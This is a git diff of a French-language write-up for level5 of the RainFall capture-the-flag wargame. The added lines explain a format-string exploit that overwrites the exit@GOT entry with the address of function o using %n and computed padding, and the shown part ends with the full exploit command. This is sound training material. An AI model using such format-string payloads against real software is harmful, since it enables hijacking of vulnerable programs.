@@ -56,7 +56,8 @@ level5@RainFall:~$ ./level5 <<< $(python -c 'print "AAAA" + "%x " * 5')
 AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825
 ```
 
-Il nous reste plus qu'a ecrire l'adresse de la fonction `o` dans celle d'`exit`
+L’adresse de la fonction `o` etant `0x080484a4` soit `134513828` en decimal et sachant que les 4 premiers octets correspondant à l’adresse de `exit@GOT` sont deja imprimes le padding est ajuste à `134513824`
+L’utilisation de `%n` permet ici d’ecrire directement les 4 octets de l’adresse de `o` en une seule fois
 
 ```bash
 level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat) | ./level5
